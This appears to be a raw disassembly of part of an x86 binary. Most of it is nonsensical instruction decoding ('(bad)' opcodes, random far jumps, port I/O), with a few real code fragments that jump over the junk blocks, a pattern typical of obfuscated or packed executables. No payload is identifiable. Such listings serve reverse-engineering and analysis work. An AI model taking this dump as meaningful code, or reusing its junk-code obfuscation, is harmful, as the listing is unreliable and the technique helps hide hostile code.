  406948:	test   DWORD PTR [edi-0x193ca051],ebx
  40694e:	stc    
  40694f:	sbb    al,0x10
  406951:	mov    ecx,0x64d5e5a1
  406956:	sub    al,0x77
  406958:	mov    ebp,0x2d177a94
  40695d:	xchg   edx,eax
  40695e:	fild   DWORD PTR [ebx+esi*8]
  406961:	popf   
  406962:	mov    cl,0x6a
  406964:	ja     0x406989
  406966:	cmp    ebx,edi
  406968:	mul    DWORD PTR [edx+0x8]
  40696b:	jae    0x406915
  40696d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40696e:	ins    BYTE PTR es:[edi],dx
  40696f:	and    eax,0xea032161
  406974:	inc    edx
  406975:	jmp    0x4705:0x6f74b68c
  40697c:	(bad)  
  40697d:	je     0x40693f
  40697f:	lods   al,BYTE PTR ds:[esi]
  406980:	dec    esp
  406981:	retf   0x742c
  406984:	ret    
  406985:	jns    0x406944
  406987:	push   edx
  406988:	out    0xad,al
  40698a:	mov    bh,0x9f
  40698c:	or     al,0x1f
  40698e:	push   ebp
  40698f:	adc    esi,DWORD PTR [ebx-0xbebf425]
  406995:	jp     0x406944
  406997:	mov    dh,0x68
  406999:	(bad)  
  40699a:	into   
  40699b:	pusha  
  40699c:	mov    dl,0xe6
  40699e:	je     0x40696e
  4069a0:	sub    bh,BYTE PTR [esi-0x16ca5218]
  4069a6:	adc    esi,eax
  4069a8:	xchg   esp,eax
  4069a9:	mov    ah,0x6e
  4069ab:	xor    bh,BYTE PTR [esi]
  4069ad:	clc    
  4069ae:	ror    BYTE PTR ss:[edi-0x22b6aa68],1
  4069b5:	lds    ebx,FWORD PTR [eax-0xf]
  4069b8:	jo     0x406963
  4069ba:	adc    eax,0xa9c46d7a
  4069bf:	push   esp
  4069c0:	cmc    
  4069c1:	sbb    eax,0x8582a587
  4069c6:	retf   0x5ac8
  4069c9:	out    dx,eax
  4069ca:	popf   
  4069cb:	push   es
  4069cc:	test   BYTE PTR [edi+0x34ecdd2e],al
  4069d2:	mov    al,ds:0x1072ce8a
  4069d7:	jns    0x40695d
  4069d9:	or     ecx,0x6c629142
  4069df:	push   edi
  4069e0:	in     al,dx
  4069e1:	loopne 0x406987
  4069e3:	mov    ebp,DWORD PTR [ebp-0x72]
  4069e6:	add    bh,BYTE PTR [esi+0x68bafa9c]
  4069ec:	pop    ds
  4069ed:	stc    
  4069ee:	dec    edi
  4069ef:	adc    eax,0x4aac10ab
  4069f4:	call   0x530b0148
  4069f9:	push   eax
  4069fa:	mov    bh,0x4
  4069fc:	(bad)  
  4069fd:	das    
  4069fe:	cmp    bh,al
  406a00:	in     al,0x86
  406a02:	sar    bl,0x2
  406a05:	jg     0x406a3a
  406a07:	push   eax
  406a08:	test   BYTE PTR [eax],cl
  406a0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a0b:	not    DWORD PTR [edx-0x63]
  406a0e:	sub    eax,0x68b2d32
  406a13:	int3   
  406a14:	and    al,0xf2
  406a16:	sub    bh,BYTE PTR [ebp-0x47d6ca8b]
  406a1c:	add    eax,0x59a6f88c
  406a21:	inc    eax
  406a22:	sub    DWORD PTR [ebp+0x54],esi
  406a25:	fst    DWORD PTR [ebx-0x1da4a71d]
  406a2b:	add    dl,0x13
  406a2e:	push   cs
  406a2f:	adc    bl,BYTE PTR [edx-0x5bee6d3e]
  406a35:	xchg   ebx,eax
  406a36:	jge    0x406a26
  406a38:	in     al,0x35
  406a3a:	cmp    al,0x23
  406a3c:	fwait
  406a3d:	push   ecx
  406a3e:	test   dl,0x1
  406a41:	push   0xffffff90
  406a43:	cbw    
  406a45:	add    ecx,DWORD PTR [eax+ebx*2]
  406a48:	das    
  406a49:	test   eax,0x2eb1e062
  406a4e:	imul   ebx,DWORD PTR [edx-0x6985ef85],0xffffffad
  406a55:	cli    
  406a56:	stc    
  406a57:	inc    ecx
  406a58:	push   ebx
  406a59:	mov    eax,ds:0xb7e91a28
  406a5e:	xchg   BYTE PTR [ecx+0x78],dl
  406a61:	and    bh,al
  406a63:	imul   ebp,DWORD PTR [ebp-0xe239793],0xffffff9a
  406a6a:	pop    esp
  406a6b:	xor    ecx,DWORD PTR [ecx-0x71c78e9c]
  406a71:	popa   
  406a72:	das    
  406a73:	jp     0x406a91
  406a75:	dec    ebx
  406a76:	push   ss
  406a77:	mov    esi,esi
  406a79:	and    al,0x49
  406a7b:	add    edi,ebp
  406a7d:	xor    edx,ebx
  406a7f:	fisubr WORD PTR [ecx]
  406a81:	pop    ecx
  406a82:	shl    BYTE PTR [esi+0x33],cl
  406a85:	sar    DWORD PTR [ecx+0x3b00],0x66
  406a8c:	add    eax,ecx
  406a8e:	mov    ecx,DWORD PTR [ebp+0x8]
  406a91:	movzx  eax,ax
  406a94:	not    eax
  406a96:	and    eax,DWORD PTR [ecx]
  406a98:	mov    ecx,DWORD PTR [ebp+0x8]
  406a9b:	mov    DWORD PTR [ecx],eax
  406a9d:	jmp    0x406d02
  406aa2:	xor    DWORD PTR [ebp-0x4],0xe149ebe
  406aa9:	jmp    0x406d02
  406aae:	mov    edx,0x55acd5ce
  406ab3:	stos   DWORD PTR es:[edi],eax
  406ab4:	gs jmp 0x1fea:0xd9dda5c
  406abc:	es add al,0x60
  406abf:	sar    DWORD PTR [esp+edi*2+0x30],0x7e
  406ac4:	jl     0x406b42
  406ac6:	leave  
  406ac7:	dec    eax
  406ac8:	outs   dx,DWORD PTR ds:[esi]
  406ac9:	mov    ebx,0xc78a536a
  406ace:	scas   eax,DWORD PTR es:[edi]
  406acf:	fist   DWORD PTR [ecx]
  406ad1:	inc    edi
  406ad2:	ins    BYTE PTR es:[edi],dx
  406ad3:	dec    esi
  406ad4:	adc    esi,ebx
  406ad6:	dec    esi
  406ad7:	pushf  
  406ad8:	inc    edx
  406ad9:	addr16 push esi
  406adb:	fsub   QWORD PTR [ebx+0x7901d430]
  406ae1:	cli    
  406ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ae3:	lea    ebx,[ebx]
  406ae5:	mov    bh,BYTE PTR [ebx]
  406ae7:	pop    ebp
  406ae8:	(bad)  
  406ae9:	and    eax,0xefd32bfc
  406aee:	cmp    eax,0x88740e35
  406af3:	ds add eax,0xb67d54dd
  406af9:	and    DWORD PTR [esi],eax
  406afb:	pop    ss
  406afc:	push   ds
  406afd:	sbb    ebx,DWORD PTR [ecx-0x1bb69401]
  406b03:	rol    esp,cl
  406b05:	and    DWORD PTR [eax+0x15],ebx
  406b08:	mul    BYTE PTR [ecx]
  406b0a:	not    BYTE PTR [edx+0x4e]
  406b0d:	cmp    cl,BYTE PTR [eax+edi*4-0x31]
  406b11:	or     edx,esp
  406b13:	xlat   BYTE PTR ds:[ebx]
  406b14:	push   ds
  406b15:	iret   
  406b16:	stos   BYTE PTR es:[edi],al
  406b17:	icebp  
  406b18:	rol    dl,1
  406b1a:	pop    edi
  406b1b:	in     eax,0x5f
  406b1d:	and    eax,0x46a8890e
  406b22:	jno    0x406b98
  406b24:	stos   DWORD PTR es:[edi],eax
  406b25:	adc    esp,DWORD PTR [eax+ebp*1+0x78]
  406b29:	(bad)  
  406b2a:	or     eax,0xa107bca0
  406b2f:	adc    BYTE PTR [ecx],al
  406b31:	repnz mov ds:0x4eb02573,eax
  406b37:	sub    DWORD PTR [edx],edx
  406b39:	ret    0xdd8e
  406b3c:	pop    esp
  406b3d:	(bad)  [edi]
  406b3f:	ficom  DWORD PTR [edx]
  406b41:	ss and al,0x33
  406b44:	push   edi
  406b45:	mov    edx,0x65740365
  406b4a:	out    dx,al
  406b4b:	gs mov esi,0xc001ac49
  406b51:	pop    esi
  406b52:	inc    edx
  406b53:	inc    esp
  406b54:	test   DWORD PTR [edi-0x4b],esi
  406b57:	ins    DWORD PTR es:[edi],dx
  406b58:	call   0x2a22ce9b
  406b5d:	sahf   
  406b5e:	lds    ebx,FWORD PTR [ecx-0x41]
  406b61:	xchg   esp,eax
  406b62:	addr16 push ebp
  406b64:	xor    DWORD PTR es:[esi+ecx*1-0x5a],esp
  406b69:	sahf   
  406b6a:	ds ret 
  406b6c:	jmp    0xb1cc1b8
  406b71:	ins    DWORD PTR es:[edi],dx
  406b72:	loope  0x406b22
  406b74:	cs dec edi
  406b76:	mov    bh,dh
  406b78:	leave  
  406b79:	cs repz ja 0x406b15
  406b7d:	pop    edi
  406b7e:	fisttp DWORD PTR [esi+edi*8+0x66]
  406b82:	imul   esp,DWORD PTR [ecx+0x6aab2d61],0xffffffa9
  406b89:	adc    DWORD PTR [edx],edi
  406b8b:	xor    BYTE PTR [ebx+0x2f7a475c],bl
  406b91:	xor    al,BYTE PTR [ebp+0x42d854ed]
  406b97:	dec    edi
  406b98:	repnz mov bh,0x7a
  406b9b:	mov    dh,0x9d
  406b9d:	stos   BYTE PTR es:[edi],al
  406b9e:	sbb    eax,DWORD PTR [edi]
  406ba0:	popf   
  406ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ba2:	mov    ebp,0x281c1aa7
  406ba7:	or     DWORD PTR ds:0xff8aea35,ebp
  406bad:	nop
  406bae:	mov    dh,0xf
  406bb0:	mov    esi,0x17bed4a4
  406bb5:	(bad)
  406bb9:	scas   al,BYTE PTR es:[edi]
  406bba:	stc    
  406bbb:	lahf   
  406bbc:	pushw  0xbdb1
  406bc0:	fisttp QWORD PTR [ebx+0x2c05885a]
  406bc6:	add    dh,bl
  406bc8:	mov    dl,al
  406bca:	ficom  WORD PTR [esi]
  406bcc:	pop    edx
  406bcd:	adc    edx,DWORD PTR ds:0x7404cc99
  406bd3:	lods   eax,DWORD PTR ds:[esi]
  406bd4:	push   0xafef12b0
  406bd9:	call   0xac7:0xce3551a4
  406be0:	int3   
  406be1:	xchg   DWORD PTR [ebx],edx
  406be3:	in     eax,0xee
  406be5:	mov    ds:0x66cd6c0d,eax
  406bea:	mov    cl,0x1e
  406bec:	mov    dh,ah
  406bee:	or     BYTE PTR [edx],al
  406bf0:	clc    
  406bf1:	xor    BYTE PTR [ebx],cl
  406bf3:	inc    ebx
  406bf4:	rol    ah,cl
  406bf6:	(bad)  
  406bf7:	sahf   
  406bf8:	push   ss
  406bf9:	pusha  
  406bfa:	mov    bl,0x99
  406bfc:	inc    edi
  406bfd:	or     DWORD PTR [ebx+0x63ceea45],0x23
  406c04:	jmp    0x406b9a
  406c06:	ret    0x7e19
  406c09:	cmp    al,0x9c
  406c0b:	mov    ecx,0xc2c51e6a
  406c10:	mov    ebp,0x925dd590
  406c15:	outs   dx,DWORD PTR ds:[esi]
  406c16:	xchg   edi,eax
  406c17:	hlt    
  406c18:	mov    bh,0xff
  406c1a:	ffreep st(7)
  406c1c:	dec    edx
  406c1d:	mov    ds:0xcac3ce79,al
  406c22:	xor    eax,0x2c7d3ef0
  406c27:	inc    edi
  406c28:	popa   
  406c29:	pop    edx
  406c2a:	sbb    eax,0xfafc4305
  406c2f:	dec    eax
  406c30:	dec    edi
  406c31:	cmp    BYTE PTR [ecx+0x786d4ba9],ah
  406c37:	xchg   ebp,eax
  406c38:	xor    dh,ah
  406c3a:	add    bh,BYTE PTR [ecx-0x73]
  406c3d:	loope  0x406bc6
  406c3f:	and    eax,0x5cdf9a82
  406c44:	push   edi
  406c45:	shl    DWORD PTR [esi+0x1da5ba80],cl
  406c4b:	jae    0x406c7a
  406c4d:	shl    WORD PTR [esi],0x2c
  406c51:	mov    edx,0xfa074647
  406c56:	rol    BYTE PTR [esi],0xd3
  406c59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c5a:	add    eax,0x12fa35e9
  406c5f:	je     0x406c5a
  406c61:	jbe    0x406ce2
  406c63:	in     eax,dx
  406c64:	repnz mov ch,0x2c
  406c67:	test   eax,0x6528df78
  406c6c:	sub    BYTE PTR [ebp-0x56],bh
  406c6f:	rcl    DWORD PTR [ebp-0xe2be7fc],cl
  406c75:	or     al,0x51
  406c77:	inc    ebx
  406c78:	mov    ds:0xfe8a516e,eax
  406c7d:	jnp    0x406c14
  406c7f:	cli    
  406c80:	int3   
  406c81:	shr    BYTE PTR [edi],0xb1
  406c84:	inc    esp
  406c85:	(bad)  
  406c87:	ja     0x406c16
  406c89:	mov    WORD PTR [edx+edi*8-0x66],cs
  406c8d:	test   BYTE PTR [ebp-0x1810a352],dl
  406c93:	jb     0x406d0d
  406c95:	inc    eax
  406c96:	push   ss
  406c97:	ja     0x406cce
  406c99:	pop    edx
  406c9a:	rcr    BYTE PTR [ecx],1
  406c9c:	adc    BYTE PTR [ecx-0x18a29d40],bl
  406ca2:	ja     0x406ce8
  406ca4:	pop    ds
  406ca5:	and    DWORD PTR [ecx],esp
  406ca7:	repz call 0x7b2d:0x35f7eb58
  406caf:	cmp    BYTE PTR [ebx-0x4bae17a1],0x1f
  406cb6:	sub    cl,0xfb
  406cb9:	or     ch,ch
  406cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cbc:	nop
  406cbd:	inc    esi
  406cbe:	inc    esi
  406cbf:	inc    edi
  406cc0:	or     DWORD PTR [eax+0x64],ebx
  406cc3:	retf   0xe7f1
  406cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cc7:	lods   al,BYTE PTR ds:[esi]
  406cc8:	and    dh,bh
  406cca:	jge    0x406ca7
  406ccc:	adc    eax,0xac730d4d
  406cd1:	sbb    eax,0x2987951c
  406cd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cd7:	mov    esi,0x9bbf1ef4
  406cdc:	into   
  406cdd:	jmp    0x6214:0x8f67e67a
  406ce4:	adc    eax,0x1fa0914b
  406ce9:	and    al,BYTE PTR [ecx+0x70db85b9]
  406cef:	inc    ecx
  406cf0:	push   eax
  406cf1:	popa   
  406cf2:	aaa    
  406cf3:	pop    ebp
  406cf4:	cmc    
  406cf5:	cmp    cl,al
  406cf7:	scas   eax,DWORD PTR es:[edi]
  406cf8:	dec    eax
  406cf9:	retf   
  406cfa:	jno    0x406d2a
  406cfc:	(bad)  
  406cfd:	sbb    edi,esi
  406cff:	xor    al,0x16
  406d01:	mov    ds:0xf8458b66,eax
  406d06:	push   DWORD PTR [ebp+0x8]
  406d09:	call   0x406d1a
  406d0e:	test   eax,eax
  406d10:	je     0x406aa2
  406d16:	leave  
  406d17:	ret    0x4
  406d1a:	push   ebp
  406d1b:	mov    ebp,esp
  406d1d:	sub    esp,0x2c
  406d20:	mov    ecx,DWORD PTR ds:0x4336ff
  406d26:	mov    ecx,DWORD PTR [ecx]
  406d28:	or     DWORD PTR ds:0x43371b,ecx
  406d2e:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  406d35:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  406d3c:	xor    DWORD PTR ds:0x43369b,0x9dc
  406d46:	mov    eax,0x9577
  406d4b:	movzx  ecx,BYTE PTR ds:0x433643
  406d52:	or     DWORD PTR ds:0x43369f,ecx
  406d58:	mov    WORD PTR [ebp-0x4],ax
  406d5c:	and    DWORD PTR ds:0x433657,0xaa
  406d66:	lea    eax,[ebp-0x24]
  406d69:	adc    DWORD PTR ds:0x43371b,ebx
  406d6f:	jmp    0x4070e5
  406d74:	mov    esp,ecx
  406d76:	in     eax,dx
  406d77:	xchg   ebx,eax
  406d78:	ins    DWORD PTR es:[edi],dx
  406d79:	mov    ebp,0xc300d269
  406d7e:	mov    bh,BYTE PTR ss:[edx]
  406d81:	push   edi
  406d82:	mov    esi,0x7cc22401
  406d87:	jl     0x406d60
  406d89:	jns    0x406e07
  406d8b:	jl     0x406de6
  406d8d:	jno    0x406d3c
  406d8f:	mov    cl,0xff
  406d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d92:	sbb    eax,0x4fa2c14f
  406d97:	fld    DWORD PTR [ebx]
  406d99:	mov    edx,0x62599a82
  406d9e:	(bad)  
  406d9f:	out    0xcc,al
  406da1:	xor    al,0x11
  406da3:	mov    ebp,0x28cbfed3
  406da8:	lods   eax,DWORD PTR ds:[esi]
  406da9:	loop   0x406d86
  406dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dac:	ins    BYTE PTR es:[edi],dx
  406dad:	stos   BYTE PTR es:[edi],al
  406dae:	pop    ecx
  406daf:	(bad)  
  406db0:	jno    0x406e31
  406db2:	dec    ecx
  406db3:	jae    0x406d48
  406db5:	iret   
  406db6:	inc    edi
  406db7:	(bad)  
  406db8:	inc    BYTE PTR [edi-0x49]
  406dbb:	jp     0x406da9
  406dbd:	xor    BYTE PTR [ebp+0xa7f1520],ah
  406dc3:	or     eax,0x91bbde5
  406dc8:	sahf   
  406dc9:	shl    DWORD PTR [ebx-0x7c],1
  406dcc:	add    eax,0x290346d9
  406dd1:	pop    es
  406dd2:	dec    ebx
  406dd3:	mov    bh,0x9e
  406dd5:	sbb    DWORD PTR [esi+0x1b],0x759477d2
  406ddc:	retf   
  406ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dde:	cld    
  406ddf:	in     al,0x6c
  406de1:	in     al,dx
  406de2:	loope  0x406daf
  406de4:	sbb    ch,BYTE PTR [ebx+esi*8+0xd7253f2]
  406deb:	sbb    ch,BYTE PTR [ebp+0x50]
  406dee:	or     ebp,DWORD PTR [eax-0x1eba7cf8]
  406df4:	jno    0x406d97
  406df6:	(bad)  
  406df7:	push   eax
  406df8:	aad    0x8e
  406dfa:	stos   DWORD PTR es:[edi],eax
  406dfb:	(bad)
  406dfe:	cld    
  406dff:	cmp    al,0x60
  406e01:	cmp    ebx,DWORD PTR [edi-0x32b2221c]
  406e07:	sar    BYTE PTR [ebp-0x7f],cl
  406e0a:	iret   
  406e0b:	and    al,0xef
  406e0d:	pop    es
  406e0e:	cmp    al,0xd2
  406e10:	jg     0x406daf
  406e12:	imul   esi,DWORD PTR [ebp+ecx*8+0x72],0x62770a1f
  406e1a:	sub    BYTE PTR [ebp+0x25398041],ah
  406e20:	out    0x66,eax
  406e22:	push   ebx
  406e23:	lea    ebp,[ecx]
  406e25:	jle    0x406daf
  406e27:	jnp    0x406e7d
  406e29:	lds    edx,FWORD PTR ds:0xefcc9fd9
  406e2f:	sahf   
  406e30:	fild   QWORD PTR [ecx]
  406e32:	inc    edx
  406e33:	ins    WORD PTR es:[edi],dx
  406e35:	imul   eax,DWORD PTR [edi],0x0
  406e38:	dec    ecx
  406e39:	xchg   esp,eax
  406e3b:	inc    eax
  406e3c:	jl     0x406e96
  406e3e:	add    DWORD PTR [ebx+ecx*8-0x2f],0xc1def6da
  406e46:	jge    0x406e02
  406e48:	xor    al,0x33
  406e4a:	push   edi
  406e4b:	popf   
  406e4c:	mov    ds:0x848f6e4e,al
  406e51:	test   BYTE PTR [esi],dl
  406e53:	(bad)  
  406e54:	sbb    ch,BYTE PTR [esi+0x2adac531]
  406e5a:	retf   
  406e5b:	mov    ?,WORD PTR [ecx-0x324c1b12]
  406e61:	xchg   ebx,eax
  406e62:	mov    ebp,0x1b0c0c0a
  406e67:	mov    ebx,0x473a62a6
  406e6c:	mov    bl,0x4e
  406e6e:	(bad)  
  406e70:	dec    edi
  406e72:	retf   0x9a73
  406e75:	loopne 0x406e34
  406e77:	or     DWORD PTR [esi-0x5ef5c54],eax
  406e7d:	pop    es
  406e7e:	push   ds
  406e7f:	dec    ebx
  406e80:	in     eax,0xd7
  406e82:	inc    eax
  406e83:	sbb    ax,0xcb1f
  406e87:	imul   ecx,DWORD PTR [ecx],0x2f
  406e8a:	bound  esi,QWORD PTR [ebx+0x2f]
  406e8d:	inc    ebp
  406e8e:	lea    ebp,[ebp+0x52b045b7]
  406e94:	and    BYTE PTR [ebx-0x3f94cf82],0x40
  406e9b:	nop
  406e9c:	dec    edi
  406e9d:	ins    BYTE PTR es:[edi],dx
  406e9e:	cmp    eax,0x2407bde
  406ea3:	pushf  
  406ea4:	xchg   esi,eax
  406ea5:	cmp    edx,esi
  406ea7:	sbb    eax,0xded8b157
  406eac:	jmp    0xe4a6afcc
  406eb1:	test   al,0x11
  406eb3:	mov    al,ds:0xe0da767
  406eb8:	xchg   BYTE PTR ds:0x93209d4b,ah
  406ebe:	add    bl,ch
  406ec0:	cdq    
  406ec1:	inc    ebp
  406ec2:	xor    BYTE PTR [ebx],bh
  406ec4:	test   al,0x74
  406ec6:	cmp    dl,BYTE PTR [esi-0x102b9a66]
  406ecc:	pop    edx
  406ecd:	adc    edx,ebp
  406ecf:	sbb    eax,0x7d1bd1fd
  406ed4:	ja     0x406e8c
  406ed6:	lock mov ds:0x27cf5f4c,al
  406edc:	ja     0x406ef9
  406ede:	ror    BYTE PTR [edx+0xc],1
  406ee1:	xor    eax,0xb6301d85
  406ee6:	cs jb  0x406f39
  406ee9:	xor    BYTE PTR [ebp-0x48080c4e],bl
  406eef:	pop    ax
  406ef1:	(bad)  
  406ef2:	or     ebp,ebx
  406ef4:	add    ebp,DWORD PTR [ecx+0xbc80b51]
  406efa:	ret    0x6290
  406efd:	out    dx,eax
  406efe:	inc    esi
  406eff:	sub    eax,0x41cd030b
  406f04:	iret   
  406f05:	sub    ebx,DWORD PTR [edi]
  406f07:	cdq    
  406f08:	mov    eax,0xc8e9827f
  406f0d:	inc    edi
  406f0e:	inc    esi
  406f0f:	pop    esp
  406f10:	hlt    
  406f11:	sbb    eax,0xc7151130
  406f16:	mov    dl,0x4f
  406f18:	add    ch,BYTE PTR [eax+eiz*4+0x48]
  406f1c:	outs   dx,BYTE PTR ds:[esi]
  406f1d:	repz mov ebx,0x56190d42
  406f23:	inc    eax
  406f24:	lods   al,BYTE PTR ds:[esi]
  406f25:	test   eax,0xd2835a99
  406f2a:	pop    edi
  406f2b:	inc    ebp
  406f2c:	or     al,BYTE PTR [eax]
  406f2e:	pop    ebp
  406f2f:	dec    ecx
  406f30:	ss dec esi
  406f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f33:	pop    ebx
  406f34:	out    dx,eax
  406f35:	std    
  406f36:	iret   
  406f37:	mov    DWORD PTR [edx],esp
  406f39:	inc    edi
  406f3a:	dec    esi
  406f3b:	call   0xfc34:0x4f74d97
  406f42:	imul   esp,DWORD PTR [esi-0x54762587],0xa28705b7
  406f4c:	and    al,0x2b
  406f4e:	lock rol DWORD PTR [esi-0x6c42275f],1
  406f55:	(bad)  [esp+esi*4-0x28d6cac7]
  406f5c:	mov    esi,0x2ba7791f
  406f61:	int3   
  406f62:	outs   dx,BYTE PTR ds:[esi]
  406f63:	cmp    DWORD PTR [ebp-0x511fbc79],0x39
  406f6a:	mov    esp,0xcc1d8cdc
  406f6f:	or     DWORD PTR [esi],edi
  406f71:	inc    edi
  406f72:	add    edi,0xffffff95
  406f75:	retf   0xcbf4
  406f78:	push   esp
  406f79:	inc    edx
  406f7a:	push   ecx
  406f7b:	bound  esp,QWORD PTR [ebp+0x6b]
  406f7e:	cmp    DWORD PTR [edi+0x61],ebx
  406f81:	mov    ds:0x43564d8,al
  406f86:	xor    DWORD PTR [edx-0x3b6770b0],edx
  406f8c:	push   es
  406f8d:	sub    esp,DWORD PTR [eax+0x5ba59908]
  406f93:	dec    edi
  406f94:	icebp  
  406f95:	jp     0x406fa3
  406f97:	push   esp
  406f98:	inc    edi
  406f99:	jne    0x406f50
  406f9b:	addr16 (bad) 
  406f9d:	mov    al,0x65
  406f9f:	out    0x3f,eax
  406fa1:	add    al,0xff
  406fa3:	jecxz  0x406fe6
  406fa5:	int3   
  406fa6:	pop    ebp
  406fa7:	scas   eax,DWORD PTR es:[edi]
  406fa8:	outs   dx,BYTE PTR ds:[esi]
  406fa9:	mov    WORD PTR [edi+0x20],ss
  406fac:	fstp   TBYTE PTR [ebx+0x0]
  406faf:	or     DWORD PTR [eax+0x542d1437],esi
  406fb5:	pop    esp
  406fb6:	or     DWORD PTR [ebx+0x44],0x6534ed15
  406fbd:	loope  0x40700a
  406fbf:	inc    ecx
  406fc0:	mov    BYTE PTR [eax-0x50213cf7],cl
  406fc6:	pop    eax
  406fc7:	cmp    dh,dl
  406fc9:	and    al,0x87
  406fcb:	push   esp
  406fcc:	outs   dx,BYTE PTR ds:[esi]
  406fcd:	sbb    DWORD PTR [esp+ecx*8-0x3c],0xffffffc1
  406fd2:	sub    al,0xb
  406fd4:	mov    ah,0x4
  406fd6:	mov    cl,0x38
  406fd8:	sub    al,0x56
  406fda:	mov    esp,0x6ed2b12c
  406fdf:	shr    BYTE PTR [esi+esi*4+0x201074c7],1
  406fe6:	sbb    BYTE PTR [edi+0x75],bh
  406fe9:	xchg   esi,eax
  406fea:	mov    eax,ds:0x686f8d3a
  406fef:	mov    dh,0x4
  406ff1:	push   0x1a31e30c
  406ff6:	clc    
  406ff7:	das    
  406ff8:	sti    
  406ff9:	out    0xea,al
  406ffb:	mov    esi,0x4b5e33f6
  407000:	push   esi
  407001:	xor    bl,BYTE PTR [ebx-0x13]
  407004:	push   es
  407005:	es dec edi
  407007:	mov    esi,0x10a883a7
  40700c:	imul   ebx,DWORD PTR [edx-0x32],0xad753415
  407013:	ja     0x40708c
  407015:	jmp    0xe27fb324
  40701a:	dec    edi
  40701b:	ficomp WORD PTR [esi]
  40701d:	stc    
  40701e:	cld    
  40701f:	fwait
  407020:	or     ah,dl
  407022:	adc    al,0x75
  407024:	mov    ds:0x7c7aa305,eax
  407029:	mov    dh,0xa1
  40702b:	cs dec ecx
  40702d:	mov    al,0xe3
  40702f:	push   edi
  407030:	ret    
  407031:	pusha  
  407032:	ds push esi
  407034:	ret    0xd50b
  407037:	mov    eax,ds:0xec0242f9
  40703c:	fs enter 0x1799,0xd
  407041:	mov    cl,0x15
  407043:	mov    bh,0x7c
  407045:	pop    eax
  407046:	aas    
  407047:	sar    esp,0x2e
  40704a:	nop
  40704b:	cld    
  40704c:	mov    esi,0x274bef64
  407051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407052:	fwait
  407053:	inc    edi
  407054:	jmp    0x407019
  407056:	(bad)  
  407057:	jo     0x407022
  407059:	dec    ebx
  40705a:	lea    esi,[esi-0x30e665fe]
  407060:	add    eax,0xea871709
  407065:	test   al,0xd9
  407067:	dec    esp
  407068:	int3   
  407069:	lds    edi,FWORD PTR [ebx]
  40706b:	fldenv [edx]
  40706d:	or     edi,DWORD PTR [ebx+0x4]
  407070:	aaa    
  407071:	pop    edx
  407072:	adc    eax,0xd01ec510
  407077:	jl     0x407048
  407079:	scas   al,BYTE PTR es:[edi]
  40707a:	cs mov ecx,0x74c46e6a
  407080:	add    al,0x78
  407083:	push   edi
  407085:	shl    DWORD PTR [eax],cl
  407087:	add    ebp,DWORD PTR [ebp-0xe89969e]
  40708d:	or     dh,cl
  40708f:	jl     0x40709e
  407091:	sbb    eax,ebp
  407093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407094:	in     al,dx
  407095:	lods   al,BYTE PTR ds:[esi]
  407096:	fcom   QWORD PTR [eax+0x34]
  407099:	inc    eax
  40709a:	cwde   
  40709b:	add    ebx,DWORD PTR [ebx]
  40709d:	sbb    ecx,DWORD PTR [edi]
  40709f:	xchg   edx,eax
  4070a0:	ret    0xc524
  4070a3:	icebp  
  4070a4:	sub    al,0xb0
  4070a6:	jno    0x4070b6
  4070a8:	cmp    dh,BYTE PTR [eax-0x413c4aad]
  4070ae:	arpl   WORD PTR [esi-0x65077577],ax
  4070b4:	cmp    DWORD PTR [edx-0x76],ebx
  4070b7:	jnp    0x407051
  4070b9:	inc    ecx
  4070ba:	stc    
  4070bb:	mov    bh,0xa9
  4070bd:	xchg   DWORD PTR es:[esi+0x7cae487d],eax
  4070c4:	mov    ch,0x23
  4070c6:	xor    cl,BYTE PTR [edi]
  4070c8:	ror    DWORD PTR [ebp+0x20776e3c],1
  4070ce:	sbb    ch,BYTE PTR [edi]
  4070d0:	(bad)  
  4070d1:	std    
  4070d2:	fwait
  4070d3:	pop    edi
  4070d4:	push   edi
  4070d5:	mov    al,ds:0x2419e02e
  4070da:	inc    ebp
  4070db:	lods   al,BYTE PTR ds:[esi]
  4070dc:	jo     0x40713e
  4070de:	in     al,dx
  4070df:	sub    BYTE PTR [edx+edx*4+0x39],bh
  4070e3:	fdivr  QWORD PTR [edx-0x77]
  4070e6:	inc    ebp
  4070e7:	fadd   DWORD PTR [ecx+0x43364f25]
  4070ed:	add    BYTE PTR [ebp+0x27],cl
  4070f0:	add    BYTE PTR [eax],al
  4070f2:	mov    eax,DWORD PTR [ebp+0x8]
  4070f5:	mov    DWORD PTR [ebp-0x20],eax
  4070f8:	xor    ecx,ecx
  4070fa:	xor    ecx,DWORD PTR ds:0x4336f3
  407100:	add    ecx,DWORD PTR ds:0x433643
  407106:	mov    DWORD PTR ds:0x4336f3,ecx
  40710c:	jmp    0x407482
  407111:	ret    
  407112:	and    dl,dl
  407114:	paddw  mm5,mm1
  407117:	int    0xf0
  407119:	xchg   DWORD PTR [esi+0xb],edx
  40711c:	dec    DWORD PTR [ecx-0x4b]
  40711f:	and    bh,bl
  407121:	dec    edi
  407123:	jl     0x4071a1
  407125:	xlat   BYTE PTR ds:[ebx]
  407126:	jns    0x4071a4
  407128:	jl     0x40715c
  40712a:	fs jae 0x40716b
  40712d:	test   al,0x50
  40712f:	dec    ebx
  407130:	not    BYTE PTR [eax+eiz*2+0x63]
  407134:	dec    ebp
  407135:	or     DWORD PTR [ebx+0x6a54abc5],0x65c8f9bf
  40713f:	dec    ebx
  407140:	and    DWORD PTR [edi+0x3be3e8f3],ebx
  407146:	hlt    
  407147:	inc    ecx
  407148:	sub    ebx,DWORD PTR [ecx]
  40714a:	and    al,0x27
  40714c:	je     0x4070d5
  40714e:	and    bl,BYTE PTR [eax+0x10bdc801]
  407154:	pop    esi
  407155:	repnz pushf 
